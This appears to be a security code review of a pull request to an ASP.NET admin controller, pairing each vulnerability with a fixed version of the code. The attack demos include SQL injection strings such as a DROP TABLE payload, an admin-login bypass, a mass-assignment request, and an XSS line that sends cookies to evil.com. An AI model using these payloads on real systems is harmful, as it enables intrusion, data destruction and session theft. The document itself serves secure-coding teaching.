# CODE REVIEW: PR #189 - Security Vulnerabilities

**PR Number:** #189
**Author:** @junior-dev (12 months experience)
**Reviewer:** @security-lead + @senior-dev
**Date:** 2024-12-03
**Status:** 🚨 CANNOT MERGE - CRITICAL SECURITY ISSUES

---

## 📊 SECURITY ASSESSMENT

| Category | Status | Severity |
|----------|--------|----------|
| SQL Injection | 🚨 CRITICAL | Multiple endpoints vulnerable |
| Authentication | 🚨 CRITICAL | Bypassable, no session management |
| Authorization | 🚨 CRITICAL | Missing checks (IDOR) |
| Data Exposure | 🚨 CRITICAL | Passwords, SSN, credit cards exposed |
| XSS | 🚨 CRITICAL | HTML injection possible |
| CSRF | 🚨 CRITICAL | No protection |
| Cryptography | ❌ FAIL | Weak tokens, no hashing |
| **Overall** | **🚨 CANNOT DEPLOY** | **Company-destroying vulnerabilities** |

---

## 🚨 CRITICAL VULNERABILITIES

### 1. **SQL Injection - Database Takeover** 🔴🔴🔴

**File:** `AdminController.cs`, Lines 11-35
**Severity:** **CRITICAL - SEVERITY 10/10**

```csharp
// ❌ CURRENT CODE:
var sql = $"SELECT * FROM Users WHERE Name LIKE '%{query}%'";
```

**💬 Security Lead:**

@junior-dev **This is the #1 web vulnerability. Allows complete database takeover.**

**Attack Demo:**
```
Normal query: "John"
→ SELECT * FROM Users WHERE Name LIKE '%John%'

Attack query: "'; DROP TABLE Users; --"
→ SELECT * FROM Users WHERE Name LIKE '%'; DROP TABLE Users; --%'
→ DELETES ENTIRE USERS TABLE!

Attack query 2: "' OR '1'='1"
→ SELECT * FROM Users WHERE Name LIKE '%' OR '1'='1%'
→ RETURNS ALL USERS (including passwords!)
```

**Real-World Impact:**
> "2023: Company had SQL injection. Attacker downloaded entire database (10M users). Sold on dark web. Result: $100M lawsuit, company bankrupt, CEO arrested."

**Required Fix:**
```csharp
// ✅ CORRECT: Parameterized queries
[HttpGet("search")]
public async Task<IActionResult> SearchUsers(string query)
{
    var users = await _context.Users
        .Where(u => EF.Functions.Like(u.Name, $"%{query}%") ||
                    EF.Functions.Like(u.Email, $"%{query}%"))
        .Select(u => new UserDto
        {
            Id = u.Id,
            Name = u.Name,
            Email = u.Email
            // NO PASSWORD!
        })
        .ToListAsync();

    return Ok(users);
}
```

**Action Required:** Fix IMMEDIATELY. This is a production blocker.

---

### 2. **Authentication Bypass** 🔴

**File:** `AdminController.cs`, Lines 38-67
**Severity:** CRITICAL

**Attack:**
```
Username: admin' --
Password: anything

SQL becomes:
SELECT * FROM Users WHERE Username = 'admin' --' AND Password = 'anything'

The -- comments out the password check!
Result: Logged in as admin WITHOUT password!
```

**Fix:**
```csharp
// ✅ CORRECT:
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await _userManager.FindByNameAsync(request.Username);

    if (user == null || !await _userManager.CheckPasswordAsync(user, request.Password))
    {
        return Unauthorized();
    }

    var token = _tokenService.GenerateJWT(user);
    return Ok(new { Token = token });
}
```

---

### 3. **Insecure Direct Object Reference (IDOR)** 🔴

**File:** `AdminController.cs`, Lines 70-95

```csharp
// ❌ CURRENT: Anyone can view ANY user!
[HttpGet("user/{id}")]
public IActionResult GetUser(int id)
{
    // No authorization check!
    return Ok(new { SSN, CreditCard }); // ❌ Exposing PII!
}
```

**Attack:**
```
Attacker iterates: /user/1, /user/2, /user/3...
Downloads all users' SSN and credit cards!
```

**Fix:**
```csharp
// ✅ CORRECT:
[HttpGet("user/{id}")]
[Authorize]
public async Task<IActionResult> GetUser(int id)
{
    var currentUserId = User.GetUserId();

    // Can only view yourself (unless admin)
    if (currentUserId != id && !User.IsInRole("Admin"))
    {
        return Forbid();
    }

    var user = await _context.Users.FindAsync(id);
    // Return DTO without sensitive data
}
```

---

### 4. **XSS (Cross-Site Scripting)** 🔴

**File:** `AdminController.cs`, Lines 98-110

**Attack:**
```
User sets bio: <script>fetch('https://evil.com?cookie='+document.cookie)</script>

When admin views profile:
→ Script executes
→ Steals admin's session cookie
→ Attacker gains admin access!
```

**Fix:**
```csharp
// ✅ CORRECT: Use [FromBody] with DTOs, return JSON
[HttpGet("profile")]
public async Task<ActionResult<UserProfileDto>> GetProfile(int userId)
{
    var user = await _context.Users.FindAsync(userId);

    return Ok(new UserProfileDto
    {
        Bio = user.Bio // ASP.NET Core auto-encodes JSON
    });
}
```

---

### 5. **Mass Assignment** 🔴

**File:** `AdminController.cs`, Lines 113-129

**Attack:**
```json
POST /update-profile
{
  "id": 123,
  "name": "Hacker",
  "isAdmin": true,    // ← Makes themselves admin!
  "balance": 999999   // ← Gives themselves money!
}
```

**Fix:**
```csharp
// ✅ CORRECT: Use DTOs that only include updatable fields
public class UpdateProfileRequest
{
    public string Name { get; set; }
    public string Email { get; set; }
    // NO IsAdmin, NO Balance!
}

[HttpPost("update-profile")]
public async Task<IActionResult> UpdateProfile([FromBody] UpdateProfileRequest request)
{
    var userId = User.GetUserId();
    var user = await _context.Users.FindAsync(userId);

    // Only update allowed fields
    user.Name = request.Name;
    user.Email = request.Email;

    await _context.SaveChangesAsync();
    return Ok();
}
```

---

## 🎯 ACTION ITEMS

### 🚨 P0 (CRITICAL - Cannot Deploy Without):
- [ ] **Fix ALL SQL injection** (use parameterized queries or EF Core)
- [ ] **Implement authentication** (JWT, ASP.NET Identity)
- [ ] **Add authorization checks** (can only access own data)
- [ ] **Remove sensitive data from responses** (no passwords, SSN, credit cards)
- [ ] **Fix XSS** (return JSON, not HTML)
- [ ] **Add CSRF protection** ([ValidateAntiForgeryToken])
- [ ] **Hash passwords** (never store plaintext)
- [ ] **Use secure tokens** (cryptographically random)

### ⚠️ P1 (Major):
- [ ] Add rate limiting (prevent brute force)
- [ ] Remove hardcoded credentials
- [ ] Fix path traversal
- [ ] Remove debug endpoints

---

## 📚 SECURITY CHECKLIST

**Every PR must pass:**

**Input Validation:**
- [ ] All user input validated
- [ ] Parameterized queries (no string concatenation)
- [ ] No path traversal vulnerabilities

**Authentication/Authorization:**
- [ ] Authentication required for sensitive endpoints
- [ ] Authorization checks (can user access this resource?)
- [ ] Session management (JWT with expiration)

**Data Protection:**
- [ ] Passwords hashed (IPasswordHasher, bcrypt)
- [ ] Sensitive data not in responses
- [ ] HTTPS enforced
- [ ] Secrets in configuration (not code)

**Attack Prevention:**
- [ ] CSRF protection enabled
- [ ] XSS prevention (return JSON, not HTML)
- [ ] Rate limiting on authentication endpoints
- [ ] No insecure deserialization

---

**Reviewer:** @security-lead + @senior-dev
**Status:** 🚨 CRITICAL SECURITY ISSUES - CANNOT MERGE

**Next Steps:** Security training required before next PR
